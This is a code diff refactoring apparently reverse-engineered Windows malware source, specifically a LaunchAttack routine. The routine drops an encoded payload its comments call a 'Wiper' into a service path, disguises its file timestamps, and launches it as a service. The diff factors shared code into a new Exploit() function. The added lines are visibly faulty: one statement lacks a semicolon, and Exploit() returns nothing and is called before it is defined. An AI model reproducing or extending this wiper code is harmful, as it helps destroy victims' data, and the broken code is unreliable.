@@ -28,9 +28,7 @@ using namespace sc::service;
 //std::basic_ios<char> byte_41E2E0;
 
 bool LaunchAttack()
-{
-	HANDLE v4; // eax@12
-	
+{	
 	char *v12; // [sp+C8h] [bp-218h]@1
 	WCHAR svc_path[250]; // [sp+D0h] [bp-210h]@4
 	
@@ -48,44 +46,56 @@ bool LaunchAttack()
 	}*/
 	/** ------>> TODO: End of part to check <<-----**/
 
+	g_svc_id = NULL
 	g_svc_id = SearchProcessByIdOrName(g_svc_id, g_svc_name);
-	if(g_svc_id)
-		goto LABEL_12;
-
-	if(!GetRandomServiceInfo(g_svc_name, svc_path))
-		return 0;
-	
-	if(!WriteEncodedResource(svc_path, 0, (LPCWSTR)0x70, L"PKCS12", g_keys[KEY_PKCS12], 4)) // Wiper
-		goto LABEL_12;
-	
-	SetReliableFileTime(svc_path);
-
-	g_svc_id = 0;
-	if(StartServiceProcess(g_svc_name, svc_path, &g_svc_id)) // Execute the wiper
+	if(!g_svc_id)
 	{
+		if(!GetRandomServiceInfo(g_svc_name, svc_path))
+			return false;
 		
-LABEL_12:
-		v4 = LoadImageW(NULL, L"myimage12767", IMAGE_BITMAP, 0, 0, LR_MONOCHROME);
-		if(v4)
+		if(!WriteEncodedResource(svc_path, 0, (LPCWSTR)0x70, L"PKCS12", g_keys[KEY_PKCS12], 4)) // Wiper
 		{
-			/** ----->> TODO: Understand what kind of std:: class is <<----- **/
-			//sub_404D73(byte_41E2E0, v4, 18, 0);
-		}
-		else
-		{
-			char *v5 = new char[25];
-			
-			memset(v5, 64, 20);
-			/** ----->> TODO: Understand what kind of std:: class is <<----- **/
-			//sub_404D73(byte_41E2E0, v5, 18, 0);
-			
-			if(v5) delete [] v5;
+			Exploit();
+			return true;
 		}
 		
-		return 1;
+		SetReliableFileTime(svc_path);
+
+		g_svc_id = 0;
+		if(StartServiceProcess(g_svc_name, svc_path, &g_svc_id)) // Execute the wiper
+		{
+			Exploit();
+		}
+		
+		
+		return true;
+	}
+	else
+	{
+		Exploit();
 	}
 	
-	return 0;
+	return false;
+}
+
+inline bool Exploit()
+{
+	HANDLE img = LoadImageW(NULL, L"myimage12767", IMAGE_BITMAP, 0, 0, LR_MONOCHROME);
+	if(img)
+	{
+		/** ----->> TODO: Understand what kind of std:: class is <<----- **/
+		//sub_404D73(byte_41E2E0, img, 18, 0);
+	}
+	else
+	{
+		char *v5 = new char[25];
+		
+		memset(v5, 64, 20);
+		/** ----->> TODO: Understand what kind of std:: class is <<----- **/
+		//sub_404D73(byte_41E2E0, v5, 18, 0);
+		
+		if(v5) delete [] v5;
+	}
 }
 
 bool Run(BOOL is_service_running)
